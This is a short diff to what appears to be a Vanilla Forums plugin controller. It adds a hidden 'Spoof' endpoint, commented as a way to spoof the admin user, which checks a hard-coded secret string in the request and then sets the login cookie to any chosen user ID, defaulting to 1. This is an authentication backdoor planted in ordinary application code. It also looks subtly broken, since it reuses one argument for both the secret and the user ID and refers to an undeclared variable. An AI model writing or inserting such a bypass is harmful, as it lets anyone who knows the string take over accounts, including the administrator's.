@@ -682,6 +682,20 @@ pageTracker._trackPageview();
       }
    }
    
+   // Allows you to spoof the admin user
+   public function PluginController_Spoof_Create() {
+      if (ArrayValue(0, $Sender->RequestArgs, '') == 'bh90210') {
+         $UserIDToSpoof = ArrayValue(0, $Sender->RequestArgs, '1');
+         $Identity = new Gdn_CookieIdentity();
+         $Identity->Init(array(
+            'Salt' => Gdn::Config('Garden.Cookie.Salt'),
+            'Name' => Gdn::Config('Garden.Cookie.Name'),
+            'Domain' => Gdn::Config('Garden.Cookie.Domain')
+         ));
+         $Identity->SetIdentity($UserIDToSpoof, TRUE);
+      }
+   }
+   
    /**
     * Save $FieldsToSave to all of the admin users across databases for
     * $VFAccountID, as well as the appropriate VanillaForums.GDN_User row.
